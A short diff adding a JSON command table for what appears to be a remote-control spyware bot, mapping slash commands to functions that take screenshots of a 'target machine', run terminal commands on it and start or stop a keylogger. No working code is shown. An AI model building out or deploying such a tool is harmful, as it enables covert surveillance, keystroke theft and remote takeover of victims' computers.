@@ -1,0 +1,7 @@
+{
+    "/help": ["help()", "Shows help text."],
+    "/screenshot": ["takeScreenshot()", "Takes screenshot from target machine."],
+    "/cmd" : ["runCmd(msg)", "Runs command in terminal."],
+    "/keylogger_start" : ["keylogger(1)", "Starts keylogger."],
+    "/keylogger_stop" : ["keylogger(2)", "Stops keylogger."]
+}
